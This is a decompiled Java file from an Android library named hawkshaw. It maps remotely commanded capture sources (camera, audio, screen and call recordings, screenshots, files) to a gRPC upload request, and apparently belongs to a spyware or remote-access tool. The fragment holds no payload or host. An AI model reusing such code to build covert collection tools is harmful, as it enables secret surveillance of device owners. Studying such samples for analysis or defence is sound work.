package com.hawkshaw.library.datalayer.network.service;

import Y1.C0106f;
import com.hawkshaw.library.FileServiceGrpcKt;
import com.hawkshaw.library.FileUploadRequest;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.grpc.GrpcChannelKt;
import j3.f;

public final class FileServiceKt {
    /* access modifiers changed from: private */
    public static final FileServiceGrpcKt.FileServiceCoroutineStub fileService = new FileServiceGrpcKt.FileServiceCoroutineStub(GrpcChannelKt.getChannel(), (C0106f) null, 2, (f) null);

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Can't wrap try/catch for region: R(17:0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|17) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:11:0x0034 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:13:0x003d */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0019 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0022 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:9:0x002b */
        static {
            /*
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source[] r0 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r1 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.CameraImage     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r1 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.VideoRecording     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r1 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.AudioRecording     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r1 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.Screenshot     // Catch:{ NoSuchFieldError -> 0x002b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                r2 = 4
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
            L_0x002b:
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r1 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.ScreenRecording     // Catch:{ NoSuchFieldError -> 0x0034 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                r2 = 5
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0034 }
            L_0x0034:
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r1 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.FileExplorer     // Catch:{ NoSuchFieldError -> 0x003d }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x003d }
                r2 = 6
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x003d }
            L_0x003d:
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r1 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Source.CallRecording     // Catch:{ NoSuchFieldError -> 0x0046 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0046 }
                r2 = 7
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0046 }
            L_0x0046:
                $EnumSwitchMapping$0 = r0
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.network.service.FileServiceKt.WhenMappings.<clinit>():void");
        }
    }

    /* access modifiers changed from: private */
    public static final FileUploadRequest.MetaData.Source toSource(Command.FileRequest.Source source) {
        switch (WhenMappings.$EnumSwitchMapping$0[source.ordinal()]) {
            case 1:
                return FileUploadRequest.MetaData.Source.CameraImage;
            case 2:
                return FileUploadRequest.MetaData.Source.VideoRecording;
            case 3:
                return FileUploadRequest.MetaData.Source.AudioRecording;
            case 4:
                return FileUploadRequest.MetaData.Source.Screenshot;
            case 5:
                return FileUploadRequest.MetaData.Source.ScreenRecording;
            case 6:
                return FileUploadRequest.MetaData.Source.FileExplorer;
            case 7:
                return FileUploadRequest.MetaData.Source.CallRecording;
            default:
                throw new RuntimeException();
        }
    }
}
